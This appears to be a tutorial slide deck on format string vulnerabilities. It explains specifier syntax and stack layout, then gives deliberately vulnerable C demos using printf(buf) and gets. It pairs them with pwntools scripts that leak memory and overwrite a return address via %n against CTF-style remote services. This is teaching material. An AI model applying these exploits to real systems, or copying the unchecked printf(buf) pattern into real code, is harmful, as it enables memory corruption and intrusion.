#Format String

廖子慶  
2016/12/20 <!-- .element: align="right" -->

---

# Introduction

```c
#include <stdio.h>
int main(int argc, char *argv[])
{
    printf("%2$hhx",10,500);
    return 0;
}
```

```shell
-12
```

--

# Struct

% offset $ field

--

# Field

Field=length+type

--

# Length

| key |  size  |
| --- |  ---   |
| hh  | 1-byte |
|  h  | 2-byte |
|  l  | 1-word |
| ll  | 2-word |

--

# Type

| key |    value     |
| --- |     ---      |
|  d  |     int      |
|  u  | unsigned-int |
|  x  |     hex      |
|  c  |     char     |
|  s  |    char*     |
|  n  |    write*    |

---

# Memory view

## x86

|  addr  |  content  |
|  ---   |    ---    |
|  esp   |  fmtstr   |
| esp+4  |   arg1    |
| esp+8  |   arg2    |
| esp+12 |   arg3    |
| esp+16 |   arg4    |
| esp+20 |   arg5    |
| esp+24 | local var |

--

## x64

| addr  |  content  |
|  ---  |    ---    |
|  rdi  |  fmtstr   |
|  rsi  |   arg1    |
|  rdx  |   arg2    |
|  rcx  |   arg3    |
|  r8   |   arg4    |
|  r9   |   arg5    |
| rsp+4 | local var |

---

# Leak

## Stack

```c
%x,%x,%x,%x
```

```c
% offset $ (l)x
```

local var, stack canary, libc_base

--

# Demo

[local](https://drive.google.com/open?id=0B5w3KuqR3zoBSW1VcFFWc2JtUE0)

```shell
nc vpn.duckll.tw 8701
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "flag.h"
int main(int argc, char *argv[])
{
    srand(time(NULL));
    int x;
    x=rand();
    char buf[100];
    int ans;
    while(1){
        gets(buf);
        ans=atoi(buf);
        if(ans==x){
            puts(flag);
            exit(0);
        }
        else{
            printf(buf);
            puts("");
            fflush(stdout);
        }
    }
    return 0;
}
```

--

## Answer

```python
from pwn import *

# io=process('./local.out')
io=remote('vpn.duckll.tw',8701)
io.sendline('%9$d')
ans=io.recvline()[:-1]
io.sendline(ans)
io.interactive()
```

---

# Leak

## Any Memory

If the buffer on stack

```c
addr % offset $s
```

global var

--

# Demo

[global](https://drive.google.com/open?id=0B5w3KuqR3zoBdVUzZjd1eE5mYjQ)

```shell
nc vpn.duckll.tw 8702
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "flag.h"
int x;
int main(int argc, char *argv[])
{
    srand(time(NULL));
    x=rand();
    char buf[100];
    int ans;
    while(1){
        gets(buf);
        ans=atoi(buf);
        if(ans==x){
            puts(flag);
            exit(0);
        }
        else{
            printf(buf);
            puts("");
            fflush(stdout);
        }
    }
    return 0;
}
```

--

## Answer

```python
from pwn import *
# io=process('./global.out')
io=remote('vpn.duckll.tw',8702)
elf=ELF('./global.out')

io.sendline("%11$s".ljust(8)+p64(elf.symbols['x']))
ans=u32(io.recvline()[:4])
print ans
io.sendline(str(ans))
io.interactive()
```

---

# Write
## Any Memory

If the buffer on stack

```c
(addr+i)*4 (%(num+tmp)c%(offset+i)$hhn)*4
```

return addr, got hajick

--

# x64 因為高位00會截斷所以要擺相反

```c
(%(num+tmp)c%(offset+i)$hhn)*4+(addr+i)*4 
```

offset稍難計算

--

# Demo

[return to flag](https://drive.google.com/open?id=0B5w3KuqR3zoBa1VNZmgtSEJQS0k)

```shell
nc vpn.duckll.tw 8703
```

```c
#include <stdio.h>
#include <stdlib.h>
void flag(){
    system("cat flag");
    return;
}
int main(int argc, char *argv[])
{
    char buf[400];
    gets(buf);
    printf(buf);
    puts("");
    fflush(stdout);
    gets(buf);
    printf(buf);
    puts("");
    return 0;
}
```

--

# Answer

```python
from pwn import *

elf=ELF('./r2f.out')
# io=process('./r2f.out')
io=remote('vpn.duckll.tw',8703)
io.sendline('%23$u')
output=io.recvline()[:-1]
print output
leak=int(output)
print "leak",hex(leak)
offset=0x8dc-0x808
retaddr=leak+offset
print "retaddr",hex(retaddr)
payload=fmtstr_payload(11,{retaddr:elf.symbols['flag']},0,'byte')
print "payload",repr(payload)
io.sendline(payload)
io.interactive()
```

---

#Q & A

--

#END

